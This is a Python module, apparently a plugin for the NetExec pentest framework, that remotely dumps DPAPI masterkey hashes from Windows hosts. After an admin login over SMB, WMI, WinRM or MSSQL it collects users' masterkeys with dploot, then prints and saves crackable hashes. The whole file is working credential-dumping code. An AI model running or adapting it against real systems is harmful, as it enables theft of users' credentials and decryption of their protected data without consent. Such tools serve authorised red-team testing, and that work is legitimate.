from dploot.triage.masterkeys import MasterkeysTriage
from nxc.helpers.misc import CATEGORY
# Based on dpapimk2john, original work by @fist0urs


class NXCModule:
    name = "dpapi_hash"
    description = "Remotely dump Dpapi hash based on masterkeys"
    supported_protocols = ["smb","wmi","winrm","mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """OUTPUTFILE       Output file to write hashes"""
        self.outputfile = None
        if "OUTPUTFILE" in module_options:
            self.outputfile = module_options["OUTPUTFILE"]

    def on_admin_login(self, context, connection):
        try:
            context.log.display("Collecting DPAPI masterkeys, grab a coffee and be patient...")
            masterkeys_triage = MasterkeysTriage(
                target=connection.dpapi_triage.target,
                conn=connection.dpapi_triage.conn,
            )
            context.log.debug(f"Masterkeys Triage: {masterkeys_triage}")
            context.log.debug("Collecting user masterkeys")
            masterkeys_triage.triage_masterkeys()
            if self.outputfile is not None:
                with open(self.outputfile, "a+") as fd:
                    for mkhash in [mkhash for masterkey in masterkeys_triage.all_looted_masterkeys for mkhash in masterkey.generate_hash()]:
                        context.log.highlight(mkhash)
                        fd.write(f"{mkhash}\n")
            else:
                for mkhash in [mkhash for masterkey in masterkeys_triage.all_looted_masterkeys for mkhash in masterkey.generate_hash()]:
                    context.log.highlight(mkhash)

        except Exception as e:
            import traceback
            traceback.print_exc()
            context.log.debug(f"Could not get masterkeys: {e}")
